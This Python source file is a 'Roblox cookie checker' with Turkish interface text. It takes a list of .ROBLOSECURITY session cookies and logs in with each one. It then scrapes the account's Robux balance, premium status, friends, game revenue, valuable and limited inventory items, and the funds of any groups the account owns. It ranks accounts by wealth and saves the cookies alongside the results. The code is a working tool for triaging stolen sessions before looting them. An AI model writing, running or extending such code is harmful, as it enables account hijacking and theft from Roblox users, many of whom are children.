import asyncio
import os
import time
import requests
from config.settings import COOKIE_FILE_PATH
from utils.file_operations import read_cookies_from_file, save_account_info, categorize_account
from api.roblox_api import RobloxAPI
from handlers.auth_handler import AuthHandler
from handlers.user_handler import UserHandler
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.progress import Progress, TextColumn, BarColumn, TaskProgressColumn, TimeRemainingColumn, SpinnerColumn
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich import box

console = Console()

MAX_CONCURRENT_CHECKS = 10

total_checks = 0
successful_checks = 0
failed_checks = 0
categories = {}

semaphore = None 

async def check_single_account(cookie, index, total, progress_task):
    global successful_checks, failed_checks, categories
    
    async with semaphore:  
        roblox_api = RobloxAPI(cookie)
        auth_handler = AuthHandler(roblox_api)
        user_handler = UserHandler(roblox_api)

        success, result = await auth_handler.login()
        
        if success:
            user = result

            user.roblox_api = roblox_api
            
            account_data = await collect_account_data_fast(user, user_handler, cookie)
            
            save_account_info(account_data)
            
            successful_checks += 1
            
            category = categorize_account(account_data)
            if category not in categories:
                categories[category] = 0
            categories[category] += 1
            
            return {
                "success": True,
                "account": account_data,
                "name": user.name
            }
        else:
            failed_checks += 1
            return {
                "success": False,
                "error": result
            }

async def collect_account_data_fast(user, user_handler, cookie):
    account_data = {
        "username": user.name,
        "display_name": user.display_name,
        "id": user.id,
        "cookie": cookie,
    }

    try:
        created_url = f"https://users.roblox.com/v1/users/{user.id}"
        created_response = requests.get(created_url)
        if created_response.status_code == 200:
            created_data = created_response.json()
            if "created" in created_data:
                created_date = created_data["created"]
                account_data["created_date"] = created_date
                
                from datetime import datetime
                try:
                    created_dt = datetime.fromisoformat(created_date.replace("Z", "+00:00"))
                    now = datetime.now().astimezone()
                    delta = now - created_dt
                    account_data["account_age_days"] = delta.days
                except:
                    account_data["account_age_days"] = 0
    except:
        account_data["account_age_days"] = 0
    
    tasks = [
        user.get_robux(),
        user.get_premium_membership(),
        user.get_friends(),
        user.get_games(),
    ]
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    account_data["robux"] = results[0] if not isinstance(results[0], Exception) else 0
    account_data["is_premium"] = results[1] if not isinstance(results[1], Exception) else False
    
    if not isinstance(results[2], Exception):
        friends = results[2]
        account_data["friend_count"] = len(friends)
        
        friend_details = []
        for friend in friends[:10]: 
            friend_details.append({
                "id": friend.get("id", 0),
                "name": friend.get("name", ""),
                "displayName": friend.get("displayName", "")
            })
        account_data["friends"] = friend_details
    else:
        account_data["friend_count"] = 0
        account_data["friends"] = []
    
    if not isinstance(results[3], Exception):
        games = results[3]
        account_data["game_count"] = len(games)
        game_details = []
        
        for game in games:
            game_detail = {
                "id": game.id,
                "name": game.name
            }
            
            try:
                game_info_url = f"https://games.roblox.com/v1/games?universeIds={game.id}"
                game_response = requests.get(game_info_url)
                if game_response.status_code == 200:
                    game_data = game_response.json()
                    if "data" in game_data and len(game_data["data"]) > 0:
                        game_info = game_data["data"][0]
                        game_detail["visits"] = game_info.get("visits", 0)
                        game_detail["created"] = game_info.get("created", "")
                        game_detail["updated"] = game_info.get("updated", "")
                        game_detail["playing"] = game_info.get("playing", 0)
                        game_detail["favorites"] = game_info.get("favorites", 0)
                        
                        try:
                            revenue_url = f"https://economy.roblox.com/v2/universes/{game.id}/revenue/summary"
                            revenue_response = requests.get(revenue_url, headers=user.roblox_api.get_headers())
                            if revenue_response.status_code == 200:
                                revenue_data = revenue_response.json()
                                game_detail["revenue"] = revenue_data
                        except:
                            pass
            except:
                pass
                
            game_details.append(game_detail)
            
        account_data["games"] = game_details
    else:
        account_data["game_count"] = 0
        account_data["games"] = []
    
    try:
        recent_games_url = f"https://games.roblox.com/v2/users/{user.id}/games/recent?limit=5"
        recent_games_response = requests.get(recent_games_url)
        
        if recent_games_response.status_code == 200:
            recent_games_data = recent_games_response.json()
            
            recent_games = []
            if "data" in recent_games_data:
                for game in recent_games_data["data"]:
                    recent_game = {
                        "id": game.get("id", 0),
                        "name": game.get("name", "Bilinmeyen Oyun"),
                        "placeId": game.get("placeId", 0),
                        "universeId": game.get("universeId", 0),
                        "lastPlayed": game.get("lastPlayed", ""),
                    }
                    recent_games.append(recent_game)
                    
            account_data["recent_games"] = recent_games
        else:
            account_data["recent_games"] = []
    except:
        account_data["recent_games"] = []
    
    try:
        inventory_items = await user.get_inventory_items()

        account_data["item_count"] = len(inventory_items)
        
        item_categories = {}
        for item in inventory_items:
            if item.category not in item_categories:
                item_categories[item.category] = 0
            item_categories[item.category] += 1
        
        account_data["item_categories"] = item_categories
        valuable_items = []
        limited_items = []
        
        for item in inventory_items:
            is_valuable = False
            item_data = {
                "id": item.id,
                "name": item.name,
                "category": item.category
            }
            
            if hasattr(item, "recent_average_price") and item.recent_average_price:
                item_data["price"] = item.recent_average_price
                if item.recent_average_price >= 1000:
                    is_valuable = True
            elif hasattr(item, "price") and item.price:
                item_data["price"] = item.price
                if item.price >= 1000:
                    is_valuable = True
            if hasattr(item, "serial") and item.serial:
                item_data["serial"] = item.serial
                limited_items.append(item_data)
                is_valuable = True   
            if is_valuable:
                valuable_items.append(item_data)
        account_data["valuable_items"] = valuable_items
        account_data["limited_items"] = limited_items
        
        simplified_inventory = []
        for item in inventory_items[:100]:
            simplified_inventory.append({
                "id": item.id,
                "name": item.name,
                "category": item.category,
                "price": getattr(item, "recent_average_price", getattr(item, "price", 0))
            })
        
        account_data["inventory_sample"] = simplified_inventory
    except Exception as e:
        account_data["item_count"] = 0
        account_data["inventory_error"] = str(e)
        account_data["valuable_items"] = []
        account_data["limited_items"] = []
    
    try:
        groups_url = f"https://groups.roblox.com/v1/users/{user.id}/groups/roles"
        groups_response = requests.get(groups_url)
        if groups_response.status_code == 200:
            groups_data = groups_response.json()
            if "data" in groups_data:
                groups = groups_data["data"]
                group_list = []
                
                for group in groups:
                    group_info = {
                        "id": group.get("group", {}).get("id", 0),
                        "name": group.get("group", {}).get("name", ""),
                        "memberCount": group.get("group", {}).get("memberCount", 0),
                        "role": group.get("role", {}).get("name", ""),
                        "rank": group.get("role", {}).get("rank", 0)
                    }
                    
                    if group.get("role", {}).get("rank", 0) >= 254: 
                        group_info["isOwner"] = True
                        
                        try:
                            funds_url = f"https://economy.roblox.com/v1/groups/{group_info['id']}/currency"
                            funds_response = requests.get(funds_url, headers=user.roblox_api.get_headers())
                            if funds_response.status_code == 200:
                                funds_data = funds_response.json()
                                group_info["funds"] = funds_data.get("robux", 0)
                        except:
                            group_info["funds"] = "Bilinmiyor"
                    else:
                        group_info["isOwner"] = False
                    
                    group_list.append(group_info)
                    
                account_data["group_count"] = len(groups)
                account_data["groups"] = group_list
                
                owned_groups = [g for g in group_list if g.get("isOwner", False)]
                account_data["owned_groups"] = owned_groups
                account_data["owned_group_count"] = len(owned_groups)
    except:
        account_data["group_count"] = 0
        account_data["groups"] = []
        account_data["owned_groups"] = []
        account_data["owned_group_count"] = 0
    
    from datetime import datetime
    account_data["scan_date"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    account_data["scan_timestamp"] = datetime.now().timestamp()
    
    return account_data

def get_results_table():
    table = Table(show_header=True, header_style="bold magenta", box=box.ROUNDED)
    
    table.add_column("Bilgi", style="dim", width=30)
    table.add_column("Değer", style="cyan")
    
    table.add_row("Toplam Kontrol Edilen Cookie", f"[bold]{total_checks}[/bold]")
    table.add_row("Başarılı Giriş", f"[bold green]{successful_checks}[/bold green]")
    table.add_row("Başarısız Giriş", f"[bold red]{failed_checks}[/bold red]")
    
    table.add_row("", "")
    table.add_row("[bold]Kategori Dağılımı[/bold]", "")
    
    if categories:
        for category, count in categories.items():
            color = get_category_color(category)
            table.add_row(f"  {category.replace('_', ' ').title()}", f"[bold {color}]{count}[/bold {color}] hesap")
    else:
        table.add_row("  Henüz veri yok", "")
    
    return table

def get_category_color(category):
    if category == "premium_zengin":
        return "gold1"
    elif category == "premium":
        return "purple"
    elif category == "zengin":
        return "green"
    elif category == "orta_seviye":
        return "cyan"
    elif category == "aktif_oyuncu":
        return "orange3"
    else:
        return "blue"

def display_animated_title():
    title_text = Text(" ROBLOX COOKIE CHECKER Twixx", style="bold magenta")
    console.print(Panel(title_text, box=box.DOUBLE_EDGE, border_style="cyan"))

async def main():
    global semaphore, total_checks, successful_checks, failed_checks, categories
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
    
    total_checks = 0
    successful_checks = 0
    failed_checks = 0
    categories = {}
    
    display_animated_title()
    
    cookie_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), COOKIE_FILE_PATH)
    cookies = read_cookies_from_file(cookie_path)
    
    if not cookies:
        console.print("[yellow]Cookie.txt dosyası bulunamadı, boş veya geçersiz.[/yellow]")
        cookies = []
        while True:
            cookie = console.input("[cyan]Roblox .ROBLOSECURITY cookie girin (çıkmak için boş bırakın): [/cyan]")
            if not cookie:
                break
            cookies.append(cookie)
    
    total_cookies = len(cookies)
    console.print(f"\n[bold]Toplam [cyan]{total_cookies}[/cyan] cookie bulundu.[/bold]")
    
    if not cookies:
        console.print("[red]Cookie bulunamadı, işlem yapılmadı.[/red]")
        return
    
    total_checks = total_cookies
    
    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(complete_style="green", finished_style="bright_green"),
        TaskProgressColumn(),
        TimeRemainingColumn(),
    )
    
    main_task = progress.add_task("[yellow]Hesaplar kontrol ediliyor...[/yellow]", total=total_cookies)
    
    with Live(get_results_table(), console=console, refresh_per_second=4) as live:
        tasks = []
        for i, cookie in enumerate(cookies, 1):
            tasks.append(check_single_account(cookie, i, total_cookies, main_task))
        completed = 0
        for batch_idx in range(0, len(tasks), MAX_CONCURRENT_CHECKS):
            batch = tasks[batch_idx:batch_idx + MAX_CONCURRENT_CHECKS]
            batch_results = await asyncio.gather(*batch)
            completed += len(batch)

            progress.update(main_task, completed=completed, description=f"[yellow]Hesaplar kontrol ediliyor... {completed}/{total_cookies}[/yellow]")
            
            for result in batch_results:
                pass
            
            live.update(get_results_table())
            live.refresh()

    console.print("\n[bold green]İşlem tamamlandı![/bold green]")
    console.print("[bold green]Tüm hesap bilgileri 'hesaplar' klasörüne kaydedildi.[/bold green]")

if __name__ == "__main__":
    asyncio.run(main()) 